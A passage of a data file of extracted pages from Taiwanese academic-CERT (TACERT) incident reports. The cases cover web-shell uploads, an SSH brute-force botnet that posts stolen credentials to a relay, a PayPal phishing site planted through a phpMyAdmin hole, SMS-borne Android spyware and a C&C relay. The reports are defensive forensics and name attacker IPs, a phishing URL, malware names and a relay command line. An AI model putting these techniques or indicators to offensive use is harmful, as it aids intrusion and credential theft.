1.駭客讀取upload.php,並且上傳惡意的00.php。 2.多個國外IP 讀取00.php 上傳惡意的php 檔。 3.日本IP:136.144.53.29 POST kmoiqfrdwe.php 17 次。 4.日本IP 陸續讀取 index.php、wp-",
        "Page_Num": "11,12,13,14"
    },
    "249": {
        "File_Name": "個案分析-X大學系所網站駭侵攻擊事件分析報告_10808.pdf",
        "content": "aespa.php、new_readme.php、wp-log.php。 5.日本IP 透過GET 與POST wp-aespa.php?path=D:/eehome 來存取網站根目 錄。 6.日本IP 透過index.php 執行一些指令。  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、建議與總結 1. 本案受害主機未開啟防火牆、未安裝防毒軟體與開啟多個駭客易攻擊的 port,降低了受害主機本身的資安防護能力。 2. 受害主機的網站因被多個國外IP 利用upload.php 上傳PHP 檔案,導致該 主機存在多個惡意檔案,其中還包含一句話木馬。 3. 在2019/1~2019/6 駭入受害主機的IP 多為國外IP,共有45 個IP,分別來 自24 個國家。 4. 本次事件發生的主要原因是日本IP:136.144.53.29 駭入網站後,使用 index.php 執行指令造成。 5. 受害主機在事件發生後才安裝防毒軟體,但所安裝的防毒軟體無法偵測出 惡意的網頁檔案,建議管理者更換防毒軟體。 6. 除開啟防火牆、更換防毒軟體與改善多個port 開啟問題外,建議定期審 視網頁程式、修補網頁程式漏洞與更新軟體。 7. 因為網站有upload 檔案的功能,建議管理者控管上傳檔案的權限。 8. 在網站日誌的管理方面,建議定期檢視日誌,來查找異常存取紀錄。 ",
        "Page_Num": "14,15"
    },
    "250": {
        "File_Name": "個案分析-Y大學大量對外進行SSH攻擊的主機事件分析報告_10405.pdf",
        "content": "個案分析- Y 大學大量對外進行SSH 攻擊的主機事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2015/5  1 I. 事件簡介 1. 該校被偵測單位開立兩張資安事件單,一張是INT 對外攻擊事件單,而另 一張EWA 資安預警事件單,主要描述有大量對外攻擊行為。 2. 該校的主機管理者請本單位協助解決,並且進行主機的數位鑑識。 3. 經詢問該主機為一台Ubuntu Linux 的作業系統,並且有架設Centos 虛擬 機提供對外學生的遠端桌面服務。 4. 上層的Centos 虛擬機透過NAT 方式與底層Ubuntu 共用對外實體IP,故 必須同時對兩個作業系統進行檢測。 5. 該主機檢測前以先斷開網路線,至本單位安裝網路分歧器(灰色)進行封包 側錄後才恢復網路。  2 II. 事件檢測 1. 恢復網路後進入底層主機terminal 介面,透過netstat 指令先觀察是否 有可疑的網路連線。因管理者告知該主機有重新啟動過,故一開始並無發 現可疑連線。 2. 該主機有啟用port 21、22、3389 的服務,分別為FTP、SSH 及RDP 服務 讓管理者能夠登入使用,因此猜測駭客可能透過這些服務漏洞入侵。  3 3. 檢查Ubuntu 的登入記錄檔 auth.log,確實發現到資安事件單派發日期前 有可疑的IP 登入紀錄。帳號 test 分別有兩筆紀錄在 22 號以前成功以 SSH 方式登入主機,IP 分別是中國的119.147.144.101 和香港的 59.188.237.12。 4. 檢查主機內是否有可疑的檔案或自動執行排程,結果相當乾淨找不出有問 題檔案。故研判應為駭客一次性入侵執行程式,一旦程式被關閉則不留痕 跡。將主機閒置一段時間並觀察是否會再次被入侵,果然發現帳號 test 有再次被登入的紀錄59.188.237.12 為上次相同登入的香港IP,並且記 錄中有使用sftp 協",
        "Page_Num": "1,2,3,4"
    },
    "251": {
        "File_Name": "個案分析-Y大學大量對外進行SSH攻擊的主機事件分析報告_10405.pdf",
        "content": "定植入後門程式,確定為駭客故意入侵行為。 5. 主機管理者告知說 test 初始是替廠商創立維護使用。但隨後維護結束後 已透過指令 userdel 將帳號疑除,實地檢查帳號test 的家目錄的確已被 移除。然而檢查 /etc/passwd 帳號管理檔案卻能發現test 依然存在,實 地測試依舊能夠透過SSH 登入,只是沒有家目錄存在。該test 帳號能夠 輕易被入侵主要原因之一是使用 test1234 的弱密碼。 6. 此時netstat 檢查網路連線狀態,確實出現了大量的對外連線,都是連到 外部IP 的port 22,也就是正在進行SSH 的暴力破解攻擊。檢查網路使 用資源幾乎是耗盡所用頻寬,故導致系統效能降低以及其他人網路變慢。  4 7. 我們能透過netstat 得知觸發網路攻擊的惡意程式為 squid64,使用指令 lsof |grep squid64 觀察squid64 在背景執行的相關動作,可以看到呼 叫該程式的帳號的確為 test,並且不斷持續地向外部IP port 22 發送封 包。值得注意的是惡意程式所存放的位置 /tmp/squid64 (deleted) 已經 被駭客移除,讓管理者無法得知該檔案內容為何。 8. 透過指令 ps 查看 squid64 的程序執行狀態,得知駭客會執行10 次 squid64 後將檔案刪除,只剩下以寫入記憶體的程序留存執行,而每一個 程序PID 都是父程序,底下各自有很多的子程序,故能夠耗盡網路資源對  5 外發動攻擊。 9. 檢查其中11924 的PID 資料夾 /proc/11924/,此資料夾確實為帳號test 所擁有,裡面放有許多可疑資料檔案,可能是PID 執行時產生的工具及記 錄。但是這些檔案的大小皆為0,可能只是暫存檔。 10. 另外用指令 fuser 查看檔案squid64 存在的位置,確實顯示該檔案已 經不存在,這是首次發現惡意程式執行後將自己刪除卻還在背景執行,當 惡意程式執行後產生新的程序並寫入記憶體,本體檔案squid64 就能被刪",
        "Page_Num": "4,5,6"
    },
    "252": {
        "File_Name": "個案分析-Y大學大量對外進行SSH攻擊的主機事件分析報告_10405.pdf",
        "content": "除。 11. 使用指令 find / -username test 查看主機內所有使用者test 的檔 案,可以看到/proc/ 下許多暫存的檔案資料夾(下圖為例),然而其內容  6 卻是空的,可能為惡意程式將破解到的帳號密碼存入暫存後回傳所用。 12. 從封包分析來看,駭客用的test 帳號在 17:38 左右開始向上層中繼站 59.188.237.12 報到傳輸主機資料,時間上大致與auth.log 紀錄中相同, 中繼站收到後開始透過帳號test 向主機進行SSH 登入。因為過程中資料 都經過加密,合理推測會下載惡意程式 squid64,並且執行後刪除。  7 13. 從封包紀錄中可以看到,主機端開始大量對外部IP 進行SSH 暴力破解, 平均每一個session 大小約有3KB,內容應該是包含破解用的密碼字典庫。 14. 當主機收集完破解SSH 成功的帳號密碼後,會開始向上層中繼站 59.188.237.12 回傳被攻擊者主機的SSH 帳號及密碼,而且是用HTTP POST 明文方式傳送內容,而由/stat.asp 接收,且大多的密碼都是常見的 簡單弱密碼。內容格式是“data=[IP 位址][帳號][密碼] ”。  8 III. 網路架構圖  9 Hackers STEP 4 SSH暴力破解攻擊 Port 22 遭入侵的主機 140.X.X.161 SSH Service STEP 2 殭屍主機報到 Port 1971 STEP 1 SSH 弱密碼入侵 測試帳號 test 中繼站 59.188.237.12 (香港) STEP 3 SFTP下載惡意程式 squid64 STEP 5 HTTP POST 破解成功的帳密 1. 駭客透過SSH 弱密碼入侵學校主機,並使用測試帳號test 登入。 2. 被入侵主機回報主機資料給中繼站。 3. 駭客從中繼站下載惡意程式 squid64 並執行後刪除檔案。 4. 主機產生十個squid64 的PID 持續對外部大量主機進行SSH 暴力破解。 5. 破解成功的主機帳號密碼透過HTTP POST 方式回傳給中繼站。 IV",
        "Page_Num": "6,7,8,9,10"
    },
    "253": {
        "File_Name": "個案分析-Y大學大量對外進行SSH攻擊的主機事件分析報告_10405.pdf",
        "content": ". 建議與總結 1. 此案例主機因為測試帳號 test 維護完後並未完全移除,而只移除了帳號 的家目錄。 2. 該主機預設有開啟SSH server 服務讓管理者連入,然而並未限制連入來 源端IP,導致駭客利用帳號 test 以及弱密碼入侵成功。 3. 駭客SSH 入侵後雖不能存取root 權限,但能透過SFTP 向想港中繼站下載 惡意程式 squid64 ,並且大量去對外部主機進行SSH 破解攻擊。 4. SSH 外部攻擊時將破解成功的主機帳號密碼透過HTTP POST 方式傳輸給上 層香港中繼站。 5. 對外SSH 破解攻擊時占用大量網路頻寬,導致單位對外網路壅塞影響其他  10 人網路使用。 6. 惡意程式排除方式為,因惡意程式squid64 主體駭客執行完就已經移除, 故只須將正在執行的惡意程式squid64 的PID 程序依序kill 刪除。 7. 漏洞修補方式則是透過將帳號test 徹底從 /etc/passwd 中移除。 8. 設定SSH 來源端登入限制,限制特定網段或IP 能夠存取,避免駭客再次 入侵,或者加強帳號的密碼強度防止輕易被破解。 ",
        "Page_Num": "10,11"
    },
    "254": {
        "File_Name": "個案分析-Z大學的PayPal釣魚網站事件分析報告_10311.pdf",
        "content": "個案分析- Z 大學的PayPal 釣魚網站 事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2014/11  1 I. 事件簡介 A. 今年九月該學校被開立一張資安事件單,內容是國外檢舉臺灣學術網路 內有一台主機偽造PayPal 的登入網頁進行釣魚攻擊行為。 B. 本單位收到來自國外的檢舉信件,內容註明該主機IP 〔203.X.X.128〕 和惡意釣魚網址 http://203.X.X.128/chiayi/afar/per.php。 C. 本單位與該校負責資安老師聯絡,知道此台主機系統為Windows XP,主 要用途是Web Service。  2 D. 本單位透過Windows 的遠端桌面協助排除惡意程式並進行數位鑑識。 II. 事件檢測 A. 因為該主機有啟用Web service,檢查得知是使用Apache 程式,而且是 安裝了Appserve 的套裝軟體,為 2.4.4a 版本。 B. 此Appserve 內有提供 phpmyadmin 的資料庫管理軟體,剛好此版本為有 漏洞的版本,駭客可以透過 /phpmyadmin/scripts/setup.php 漏洞植入 後門程式。 1. 原本的setup.php 已經被駭客改過,當我們嘗試輸入該漏洞位址時, 會轉跳至 /phpmyadmin/error.php 的頁面。 C. 檢查Apache 的access.log 得知,漏洞setup.php 被許多IP 存取過,成 功寫入的紀錄高達1435 次,而最後一次是被來自中國北京的IP 221.208.57.228 所存取,是透過HTTP POST 方式寫入。 D. 開啟釣魚頁面 /chiayi/afar/per.php 後會轉跳至外部的偽造網站,是 位於網站 http://www.ynkexins.com/tmp/... 的頁面,並且顯示填入信  3 用卡的數字欄位。 1. 檢視 per.php 的程式碼,能夠取得使用者的IP 位址、登入的帳號密 碼,並且將這些資訊存入同樣資料夾的 hai5",
        "Page_Num": "1,2,3,4"
    },
    "255": {
        "File_Name": "個案分析-Z大學的PayPal釣魚網站事件分析報告_10311.pdf",
        "content": ".txt 中,最後有轉跳網 址至Paypal 的釣魚頁面 “http://www.ynkexins.com/tmp/enacc/location/us/jmaster/jtrei/inxtus.ht ml?emoreus=1988998s0198239712y1982731029381123o123917239861 285s67125398172379187y1092388912732891123132e01928301273198 1623713211”。 2. 檢視檔案 /chiayi/afar/rela.php 可以看到信用卡號的欄位資料將 會傳送出去,並且寫入記錄檔 hai5.txt 中。  4 3. 網域名稱www.ynkexins.com 的IP 解析為220.163.10.42,位於中國 北京。該網站由署名「云南科技信息职业学院」製作,是一個論壇架 構的網站,然而真正的官方網站應該為 www.ynkexins.cn,可能是駭 客用來掩人耳目所用。 4. 檢查同路徑下的檔案 hai5.txt 內容,確實記錄許多受害者填入的個人 資料,如User、Pass、IP 和信用卡號 Numb 等資訊,下圖的信用卡 號是使用者隨意輸入的錯誤資料。  5 E. 另外還發現到在 /appserv/host/ 下有駭客植入的工具檔案 unzip.exe,目 的是將植入的壓縮檔 optic1.zip 解開並置於/appserv/host/optic1/,檢查 解壓縮內容為另一釣魚網頁程式碼。 1. 首先開啟 /appserv/host/opitc1/member53092302.html 後,為一個偽 造的加拿大信用卡金融資料的輸入頁面,主要有包含到敏感性個資和 信用卡號碼等。 2. 檢視 /appserv/host/opitc1/202.php 程式碼可以得知釣魚網頁的欄位 確實透過該程式碼POST 出去,其中主要帶有IP、信用卡號和將資料 存入檔案 30.txt 中。  6 3. 檢視 /appserv/host/opitc1/30.txt 文件內容得知,確實記錄了一筆欄 位上需求的資料,不過填入",
        "Page_Num": "4,5,6,7"
    },
    "256": {
        "File_Name": "個案分析-Z大學的PayPal釣魚網站事件分析報告_10311.pdf",
        "content": "資料為假的,為使用者測試時候所填入, 但最後留下的來自法國的IP 位址178.33.28.149,可能為駭客所用。 4. 使用掃毒軟體針對系統進行檢測並無發現任何異常程式,研判駭客只 是單純透過setup.php 漏洞植入一些php 的釣魚網頁。 III. 網路架構圖  7 Hacker STEP 1 : 駭客透過網站漏洞 setup.php入侵植入惡意程式和網頁。 STEP 2 : 不知情的受害者將個資輸入偽造的 Paypal 網頁。 STEP 3 : 釣魚網站收到資料存成文件並再傳給上層中國釣魚網站。 STEP 4 : 駭客能控制上層的釣魚網站並撈取回收的資料。 STEP 2 Paypal Phishing Phishing Web (TW) 203.X.X.128 Victims STEP 3 Data report & Web Redirect STEP 1 setup.php 漏洞存取 Phishing Web(CN) 220.163.10.42 STEP 4 控制上層釣魚網站 IV. 建議與總結 A. 此事件主機主要是駭客透過已知舊版appserv 的漏洞 phpmyadmin/ scripts/setup.php 來修改網站資料夾 /www/ 中的檔案,並將釣魚網頁及 程式碼 php 放入其中目錄。 B. 當受害者誤點該網頁並輸入個人敏感性資料後,會將檔案傳至上層的釣 魚網站 http://www.ynkexins.com/... 底下,駭客能從中撈取資料。 C. 當使用者填入個人金融資料後,除了將資料回傳給駭客,並還會將記錄 檔存在主機中,如「hai5.txt」和「30.txt」。 D. 安裝phpmyadmin 套件後務必檢查 setup.php 是否存在,若存在此檔案 要將之移除。 E. 若主機有開啟遠端桌面功能,務必關閉或設定防火牆限制來源端連入。 F. 不定期檢查伺服器資料夾底下是否有可疑的php 或其他文件檔案。 ",
        "Page_Num": "7,8"
    },
    "257": {
        "File_Name": "個案分析-事件附檔的來源IP與目的IP_10203.pdf",
        "content": "個案分析- 事件單附檔中的來源IP 與目的IP TACERT 臺灣學術網路危機處理中心團隊製 2013/03  1 Taiwan Academic Network Computer emergency Response Team(TACERT) 前言 學術網路資安偵測團隊於開立資安事件單時會夾帶事件的原始佐證資料至教育機構資 安通報平台中(事件附檔下載方法請按這裡),事件附檔提供資安聯絡人更進一步的資訊, 找出資安事件發生原因並處理之。事件單本身並沒有提供太多的事件相關訊息,多數時 候僅能仰賴事件附檔中的事件發生時間、目標主機網路位址兩個資訊辨認事件發生原因。 日前接獲一線單位資安聯絡人來電,表示資安事件誤判,究其原因,其實是事件佐證資 料裡面的來源與目的IP 讓人誤會,因而以為是誤判。 事件描述 主機資訊:  Ubuntu  Web Server(Apache2)提供學生上繳電子檔作業  主機前端防火牆對外網僅開放http/https/dns/SMTP/DHCP6/FTP/NTP 服務 圖1 事件附檔 圖1 為此案例的事件附檔,其攻擊來源為163.xx.xx.148:80,目標為118.165.xxx.168 以 字面上的「來源IP」與「目的IP」來看,會以為是163.xx.xx.148 發動對118.165.xxx.168 的攻擊,因此事件處理人認為這起事件是誤報,因為其主機前端的防火牆,僅提供 http/https/dns/SMTP/DHCP6/FTP/NTP 這幾個服務通過,而port 1756、1652、1708 並不 在這些服務之列。 實際上,事件附檔中的「來源IP」與「目的IP」,僅是帶有符合偵測特徵封包的「來源」 與「目的」IP,而非這個TCP 連線的起始「來源IP」與「目的IP」。以這個例子來說, 佐證資料顯示帶有攻擊特徵的封包來源是163.xx.xx.148:80,port 80 HTTP。初步判斷這  2 Taiwan Academic Network Computer emergency Response Team(TACERT) ",
        "Page_Num": "1,2,3"
    },
    "258": {
        "File_Name": "個案分析-事件附檔的來源IP與目的IP_10203.pdf",
        "content": "起資安事件和163.xx.xx.148 主機上的Web Server 有關係,調出163.xx.xx.148 主機的Web Log,尋找符合時間與118.165.xxx.168 網路位址的紀錄: 圖2 163.xx.xx.148 主機的Web Log 中符合事件附檔的紀錄 從Web Log 中可以看到118.165.xxx.168 這個IP 在與事件附檔符合的時間點,從 163.xx.xx.148 下載了一個檔案,在Log 中由於URL 編碼的關係,看起來很不能理解, 將編碼還原之後,可以得到檔案的完整路徑名稱: /moodle/file.php/23/moddata/assignment/31/997/企鵝-超血腥版.exe 163.xx.xx.148 提供學生上傳作業,校內學生把這個平台當成網路硬碟,上傳了被防毒軟 體偵測出有問題的Flash 小遊戲,回到家之後,登入學校的平台下載該Flash 小遊戲, 因而觸發資安事件。Http 連線必須先經過三向交握(如圖3): 一、 118.165.xxx.168 主動送出SYN 給163.xx.xx.148:80 請求服務 二、 163.xx.xx.148 送出 SYN+ACK 答應 三、 118.165.xxx.168 回應 ACK 四、 之後 163.xx.xx.148 把 118.165.xxx.168 請求的「企鵝-超血腥版.exe」傳送給它 由於惡意檔案的傳送出現在第四步驟,所以事件單的附檔來源是163.xx.xx.148 目的是 118.165.xxx.168 因而造成事件負責人的誤解,以為該事件單是誤報。  3 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖3 事件的連線流程,惡意流量從Server 端到Client 端時被偵測到 埠號與服務 在網路通訊協定的規範文件中(RFC1700),port 0 到port 1023 是保留給系統服務,或 是擁有特權的服務使用,其中比較常見的如下列: Port Number Service 20/tcp FTP Data 21",
        "Page_Num": "3,4"
    },
    "259": {
        "File_Name": "個案分析-事件附檔的來源IP與目的IP_10203.pdf",
        "content": "/tcp FTP 23/tcp telnet 25/tcp SMTP 53/udp DNS 80/tcp HTTP 表1 常見的Port 以及其服務 如果遇到事件附檔中,攻擊主機的來源Port 是某個服務使用的特殊Port,多半和該服務 有關係,可以直接將事件單附檔中的時間與目的網路位址當關鍵字,到該服務的Log 中 比對,找出可能原因。  4 Taiwan Academic Network Computer emergency Response Team(TACERT) 建議措施  建議上傳檔案應先經過防毒軟體掃描再儲存 電子化是不可避免的趨勢,學校提供平台上傳作業立意良善,也讓作業可以電子檔的樣 式呈現,但是難以要求使用者對上傳的檔案先進行掃毒再上傳,所以建議由伺服器端將 上傳的檔案放置位置獨立出來,可以避免與重要的系統放置在同一個硬碟或同一台主機, 加上不斷上傳的檔案會佔用硬碟空間,可以避免重要的系統碟空間被用光,並且在使用 者上傳到伺服器時進行防毒掃描,對檔案進行基本的過濾。 ",
        "Page_Num": "4,5"
    },
    "260": {
        "File_Name": "個案分析-來自手機簡訊的惡意程式攻擊分析報告_10209.pdf",
        "content": "個案分析- 來自手機簡訊的惡意程式攻擊 分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2013/09  1 前言 智慧型手機已經是目前市場主流的手持設備,可說是小型移動式電腦。該設備幾乎都能透過 WiFi 或3G 等方式上網,然而與一般電腦不同的是,大多的使用者都不會在手機裡安裝防毒軟 體,一旦被駭客入侵可能就會造成個人資料外洩。 主要原因是因為使用者還是將智慧型手機當作是一般的手機,沒有電腦的觀念。 事件說明 一、 事件經過: 1. 某網友在國內知名BBS 站[PTT]的反詐騙版[Bunco]發文,表示自己疑似收到詐騙的SMS 簡訊。 2. 由截圖發現該簡訊會以『XXX 被偷拍的是你麼』為主旨(XXX 是該用戶姓名),並附上 一個URL 作為連結。 圖1、PTT 內文和簡訊內容 3. 發信來源的門號為簡訊代轉發的公司,主要提供「手機版簡訊平台」服務讓使用者不會 透露自己發送的門號,很適合做為駭客使用。 4. 此簡訊提供網址IP [199.101.117.21] 的國別為US 美國LA。  2 5. 實地將該網址“http://199.101.117.21/index.php”點入,透過Firefox 的瀏覽器監看工具可以 看到其行為,是下載一個Android 所用的程式安裝檔,其檔名為『images.apk』。 圖2、HTTP 的Header 動作為File Transfer。 6. 先將該APK 檔用線上Virustotal 檢測,惡意程式的檢出比例為2/45,確實為一個後門程 式。 二、 惡意程式的測試過程: 1. 使用虛擬機器VirtualBox 配合Genymotion 的智慧型裝置模擬器,創建一個Andorid 4.2.2 的手機平台。 2. 使用Wireshark 側錄該設備的網路流量。 3. 使用實體IP 並安裝該『images.apk』,安裝時的軟體名稱為“Sys Config”,且圖示為iPhone 的設定樣式。 4. 該程式“Sys Config",
        "Page_Num": "1,2,3"
    },
    "261": {
        "File_Name": "個案分析-來自手機簡訊的惡意程式攻擊分析報告_10209.pdf",
        "content": "” 要求的隱私及存取權限有: (1). 讀取手機狀態和識別碼。 (2). SMS 簡訊的發送、讀取、編輯。 (3). 設備的概略位置。 (4). 修改和刪除SD 卡的內容。 (5). 完整網路的存取及狀態。 (6). 啟動時自動執行。 (7). 測試能否存取受保護的儲存裝置。  3 5. 安裝完成後會該程式無法點入,會一直出現「很抱歉,Sys Config 已停止」的訊息,此 時其實已經在背景執行網路行為,重開機後依然會出現該訊息,自動背景執行。 6. 觀察側錄的網路流量封包: (1). 透過封包分析發現該程式會一直向IP: 216.244.79.37 的port 80 傳送資料,使用的方 式為HTTP POST。因為測試主機並無登入任何帳號和密碼,從網路行為上來看應該 是會竊取個資。 (2). 下圖得知該程式會將左下紅框的資料POST 至Server 端的 /index.php/Backdoor/task_query 下,而Server 端成功接收後回覆HTTP/1.1 200 OK。 (3). IP [216.244.79.37] 位於美國的西雅圖,實際開啟該網站為一個Web 的登入畫面,並 且顯示是簡體中文,該主機可能是被大陸駭客用來當作跳板。  4 (4). 網域名稱為“member.updatalook.com”的正解為IP [216.244.79.37],然而並無反解。 7. 觀察側錄的網路流量封包 (1). 透過設備終端機指令 netstat 記錄到當時手機資料正在被傳輸給駭客。 (2). Process State :PS 8. 解決方式 (1). 使用內建的應用程式管理將該程式移除「Sys Config」。 (2). 更改內存的密碼,如Google 和Facebook 等。 (3). 備份個人資料至外部或雲端,通訊錄可以用Gmail 自動同步備份。 (4). 若擔心惡意程式移除不乾淨,建議設備還原至原廠設定。 tcp6 0 1 ::ffff:140.x.x.147:557",
        "Page_Num": "3,4,5"
    },
    "262": {
        "File_Name": "個案分析-來自手機簡訊的惡意程式攻擊分析報告_10209.pdf",
        "content": "24 ::ffff:216.244.79.37:80 CLOSE_WAIT tcp6 0 0 ::ffff:140.x.x.147:47972 ::ffff:216.244.79.37:80 TIME_WAIT tcp6 0 0 ::ffff:140.x.x.147:36675 ::ffff:216.244.79.37:80 TIME_WAIT tcp6 0 0 ::ffff:140.x.x.147:60116 ::ffff:216.244.79.37:80 TIME_WAIT tcp6 0 1 ::ffff:140.x.x.147:46847 ::ffff:74.217.75.7:443 CLOSE_WAIT tcp6 0 0 ::ffff:140.x.x.147:48030 ::ffff:216.244.79.37:80 ESTABLISHED tcp6 0 0 ::ffff:140.x.x.147:49093 ::ffff:216.244.79.37:80 TIME_WAIT tcp6 0 0 ::ffff:140.x.x.147:39076 ::ffff:216.244.79.37:80 ESTABLISHED USER PID PPID VSIZE RSS WCHAN PC NAME u0_a62 1374 127 498764 21396 ffffffff b753ea07 S au.com.phil.minepro  5 建議措施 1. 盡量不要安裝來路不明的軟體,除非能確定它的功能作用。 2. 安裝軟體時看注意軟體會存取的權限,避免較高權限被使用。 3. 當軟體安裝完後無法開啟或有錯誤時,先關閉網路並盡速移除。 4. 安裝不明檔案前先透過Virustotal 進行線上掃毒,或安裝手機的防毒軟體。 5. 網路上很多論壇會提供號稱是某某破解版的APK 供人下載,未來很有可能會被駭客 用來植入後門的一個途徑,務必小心避免個資外洩。 ",
        "Page_Num": "5,6"
    },
    "263": {
        "File_Name": "個案分析-個案分析-C&C中繼站分析.pdf",
        "content": "1 Taiwan Academic Network Computer emergency Response Team(TACERT) 個案分析- C&C 分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2013/1  2 Taiwan Academic Network Computer emergency Response Team(TACERT) 目錄 前言............................................................................... 3 中繼站與上下層的網路架構 ....................................... 3 中繼站主機狀態 ........................................................... 5 建議............................................................................... 6  3 Taiwan Academic Network Computer emergency Response Team(TACERT) 前言 駭客在從事惡意活動時,為了掩藏自己的網路位址,會透過中繼站主機,對遠端的受害 主機進行操控,透過中繼站活動,即使受害主機被發現,也只會得到中繼站主機的資訊, 而不會知道駭客的真實網路位址。由於中繼站主機必須隨時都能讓駭客使用,所以中繼 站多半是網路位址固定且二十四小時運轉的主機。本次的案例分析介紹一個典型的中繼 站。 中繼站主機資訊: – Windows2003 – 校務系統 – 另有Database 主機與Mail server 主機聯合提供服務 中繼站與上下層的網路架構 圖1 經由側錄中繼站主機的網路流量,概略得出圖1,主機的port 443 與1021 由同一個程式 mp.exe 佔用(綠色框部份),其程式執行的command line 為[mp.exe -S:1021 -S:443],這 個程式主要擔當Master 與目標主機間的命令與資料傳遞,Master 傳遞命令到 xxx.60.141.45 的1021 埠後,再從xxx.60.141.45 的443 埠傳給目標主機。  4 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖2 Master 在163.xx.189.85 主機上透過網芳竊取163.xx.189.0 網段中其他主機的資料 Master 透過中繼站取得目標主機(Target)的控制權後,利用網路芳鄰,竊取163.xx.189.0 網段中其他主機的資料。先用網芳將其他PC 的資料傳到163.xx.189.85 主機上,接著再 從163.xx.189.85 主機",
        "Page_Num": "1,2,3,4"
    },
    "264": {
        "File_Name": "個案分析-個案分析-C&C中繼站分析.pdf",
        "content": "上用xxx.60.141.45 的443 port 將資料傳回給Master。 圖3 mp.exe 使用的參數以及DLL 這個網路活動架構顯示,駭客並不一定需要感染每一台主機才能竊取資料,只要可以獲 得同網段中的某一台主機的控制權,就可以利用網芳進行攻擊或是竊取資料。  5 Taiwan Academic Network Computer emergency Response Team(TACERT) 中繼站主機狀態 在中繼站主機中,上段所介紹的mp.exe 並沒有被寫到登錄檔中,主機重新開關機後並 不會自動啟動。駭客僅在登錄檔中寫入(圖4)[wmdmpmspex.dll]這個惡意DLL 檔,此 DLL 檔為後門程式,開啟port 1023 供駭客控制中繼站主機。每當主機重新開關機,mp.exe 會被關閉,駭客透過wmdmpmspex.dll 提供的後門在主機上把mp.exe 執行起來。圖5 中 可以看到駭客先是透過port 1023 連進xxx.60.141.45,用[netstat -an]和[find]指令找是否 有port 443 的活動,此時,主機上僅有xxx.60.141.45 與其資料庫xxx.60.141.123 的活動, 接著駭客用指令[mp -S:1021 -S:443]將mp.exe 啟動,透過該程式控制Target。 圖4 後門程式在登錄檔中的登錄資料 圖5 駭客透過port 1023 進入主機下指令  6 Taiwan Academic Network Computer emergency Response Team(TACERT) 中繼站主機上另有一個駭客拿來偷取中繼站主機上帳號密碼的惡意DLL,完整名稱為 [qmgrxp.dll],這個DLL 也被註冊到登錄檔裡面,主要用來偷取中繼站主機上如網芳或 遠端等網路活動時出現的密碼。 圖6 qmgrxp.dll 在登錄檔裡面的名稱 這兩個惡意的DLL 檔案,在登錄檔裡面的註冊描述,分別為:  BITS c:\\windows\\system32\\qmgrxp.dll ",
        "Page_Num": "4,5,6"
    },
    "265": {
        "File_Name": "個案分析-個案分析-C&C中繼站分析.pdf",
        "content": " 使用閒置網路頻寬於背景轉移檔案。如果服務停止的話,Windows Update 和 MSN Explorer 等功能將無法自動下載程式或其他資訊。如果此服務被停用的 話,任何依賴它的服務如果沒有防止失敗的機制,在 BITS 被停用的情況下, 利用 IE 直接轉移檔案的話,它們將無法轉移檔案。  WmdmPmSp c:\\windows\\system32\\wmdmpmspex.dll  傳送磁碟區資訊到邏輯磁碟管理系統管理服務以供設定。如果這個服務被停止, 動態磁碟狀態和設定資訊可能會過時。如果這個服務被停用,任何明確依存於 它的服務將無法啟動。 駭客利用人們害怕犯錯的心理狀態,尤其是管理主機的管理者,必須對主機上的服務負 責,在登錄檔描述的地方寫了很多關於這個項目如果被移除會發生什麼後果的敘述,使 得主機管理者不敢輕易移除,以確保惡意程式的存活時間。 建議  利用線上搜尋引擎和線上掃毒引擎 當我們發現主機上有可疑的程式或是DLL 檔案時,最快速的檢查方法就是把名稱放到 Google 去搜尋,或是將檔案傳到VirusTotal 上檢查。若是由作業系統或應用程式所使用 的DLL,通常都可以在Google 上找到許多資料(如圖7),而本例子中出現的兩個惡意 DLL,在Google 搜尋引擎中僅有不到50 筆的資料(如圖8 圖9),當搜尋引擎的結果讓 這個DLL 看起來很可疑時,就可以進一步把它們放到VirusTotal 上檢查,這個例子出現 的DLL 被超過一半的防毒引擎偵測出有問題(如圖10 圖11)。  7 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖7 正常的DLL 在Google 上面可以找到許多資料 圖8 有問題的DLL 在Google 搜尋的結果很少  8 Taiwan Academic Network Computer emergency Response Team(TACERT) 圖9 圖10 VirusTotal 對qmgrxp.dll 的掃描結果 圖 11 irusTotal 對WmdmPmSpex.dll 的掃描結果  9 Taiwan Academic",
        "Page_Num": "6,7,8,9"
    },
    "266": {
        "File_Name": "個案分析-個案分析-C&C中繼站分析.pdf",
        "content": "Network Computer emergency Response Team(TACERT)  備份主機開啟的埠號,定期檢查 如果主機被開了後門,在網路狀態上面通常可以發現多餘的埠號被開啟,但是對管理多 台主機的管理人員而言,記憶每一台主機的應該開啟的埠號是不可能的,建議在主機完 成安裝及服務設定,上線前備份埠號的開啟狀態,此時主機的網路狀態應該是最「正常」 的,主機上線後,在沒有新增其他服務的條件下,定期比對網路埠號的使用狀態,如有 新增的異常埠號,很容易就可以發現。 ",
        "Page_Num": "9"
    },
    "267": {
        "File_Name": "個案分析-假冒寄件者回信之網路釣魚攻擊事件分析報告_10811.pdf",
        "content": "假冒寄件者回信之網路 釣魚攻擊事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2019 年11 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 本中心在2019/9/27 收到來自hsxx99@edu.tw 寄件者的回信,信件主旨為 「RE:(事件單編號:AISAC-1XXX97)(1 級)事件單結案通知信」,內容以一段英 文撰寫,並且包含一個下載連結與2019/7/17 某事件單結案通知信內容。 2. 使用hsxx99@edu.tw 於網路上搜尋,發現某國小的公務信箱 hsxx99@mail.edu.tw 與此類似,也發現hsxx99@mail.edu.tw 信箱來自教育部 校園雲端電子郵件系統(https://mail.edu.tw),而且本中心所收到來自 hsxx99@edu.tw 寄件者的事件單結案通知信也是該國小的資安事件單。 3. 為檢測hsxx99@mail.edu.tw 信箱是否有Auto Reply 功能,本中心在2019/09/27 上午11:09 以信件主旨:for you 寄測試信至hsxx99@mail.edu.tw 信箱,測試後 確定該信箱並無自動回信功能,而信箱所有者告知有收到測試信,並且未發  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 現信箱有異常。 4. 在2019/10/1 下午09:25 本中心寄測試信的信箱收到來自hsxx99@edu.tw 寄 